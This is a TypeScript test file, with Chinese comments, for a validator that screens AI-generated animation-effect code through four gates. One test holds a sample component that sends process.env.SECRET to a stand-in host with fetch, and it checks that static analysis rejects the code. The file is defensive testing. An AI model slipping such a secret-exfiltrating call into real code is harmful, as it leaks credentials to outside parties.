import { describe, expect, it } from 'vitest';
import { EFFECT_TEMPLATES } from '@ancs/domain';
import { validateMotion } from './validator.ts';

/**
 * V6-3：特效模板库的每一段代码都过 Custom Motion 四道门禁（静态分析 → 类型检查 → 沙箱评估 → 抽帧），
 * 与 AI 当场写的特效代码同一标准；抽帧在不同时刻输出不同（是动画，不是静帧）。
 * 门禁里的确定性随机数 random(key) 与渲染页面里同名全局语义一致（同 key 同值）。
 */

const FIXTURE = { fps: 30, durationInFrames: 45, width: 480, height: 270 };
const SAMPLE_FRAMES = [0, 11, 22, 44];

describe('特效模板 × 四道门禁', () => {
  it.each(EFFECT_TEMPLATES.map((template) => [template.id, template] as const))('%s → APPROVED，抽帧有变化', async (_id, template) => {
    const props = Object.fromEntries(template.params.map((param) => [param.key, param.default]));
    const report = await validateMotion({ code: template.code, name: template.name.en, fixture: { ...FIXTURE, props }, sampleFrames: SAMPLE_FRAMES });
    expect(report.stages.filter((stage) => !stage.ok)).toEqual([]);
    expect(report.verdict).toBe('APPROVED');
    expect(new Set(report.frames.map((frame) => frame.sha256)).size).toBeGreaterThan(1);
  });

  it('AI 写的特效代码若尝试联网或读环境 → 第一道门拒绝', async () => {
    const code = "registerMotion({ name: 'Bad', component: function Bad() { fetch('https://example.invalid/' + process.env.SECRET); return React.createElement(AbsoluteFill, null); } });";
    const report = await validateMotion({ code, name: 'Bad', fixture: { ...FIXTURE, props: {} }, sampleFrames: SAMPLE_FRAMES });
    expect(report.verdict).toBe('REJECTED');
    expect(report.stages.map((stage) => stage.stage)).toEqual(['STATIC_ANALYSIS']);
  });
});
